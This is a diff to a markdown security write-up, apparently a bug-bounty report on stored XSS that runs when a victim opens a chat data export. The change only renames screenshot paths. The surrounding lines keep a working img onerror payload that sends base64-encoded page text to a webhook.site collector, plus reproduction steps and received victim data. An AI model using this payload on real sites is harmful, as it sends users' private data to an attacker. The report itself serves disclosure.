@@ -43,14 +43,14 @@ This bypass confirms the filter is not a real XSS mitigation.
 ```html
 <img src=x onerror="fetch('https:'+'//webhook.site/<ID>/?d='+btoa(document.body.innerText.substring(0,500)))">
 ```
-![Base64 decoded PII data](/assets/img/posts/Screenshot 2026-10-01 194400.png)
+![Base64 decoded PII data](/assets/img/posts/Screenshot-2026-10-01-194400.png)
 
 
 **3.** The message is stored and rendered as plain text in the live chat UI, no execution occurs there.
 
 **4.** From the **victim account** (which never wrote anything malicious), go to:  
 *Settings → Privacy → Request data export* → confirm via email → download the ZIP.
-![Webhook receiving the exfiltrated request](/assets/img/posts/Screenshot 2026-10-01 215639.png)
+![Webhook receiving the exfiltrated request](/assets/img/posts/Screenshot-2026-10-01-215639.png)
 
 **5.** Open the HTML file inside the archive:  
 `file:///.../messages/index.html`
@@ -63,12 +63,12 @@ This bypass confirms the filter is not a real XSS mitigation.
 ## Evidence
 
 **Payload received at webhook:**
-![Data export ZIP with messages folder](/assets/img/posts/Screenshot 2026-10-01 214958.png)
+![Data export ZIP with messages folder](/assets/img/posts/Screenshot-2026-10-01-214958.png)
 
 d=TWVzc2FnZXMKTWVzc2FnZSB0aHJlYWRzIHlvdSd2ZS4uLg==
 
 **Decoded content (real victim account data):** 
-![Payload sent in chat](/assets/img/posts/Screenshot 2026-10-01 215433.png)
+![Payload sent in chat](/assets/img/posts/Screenshot-2026-10-01-215433.png)
 
 
 Messages
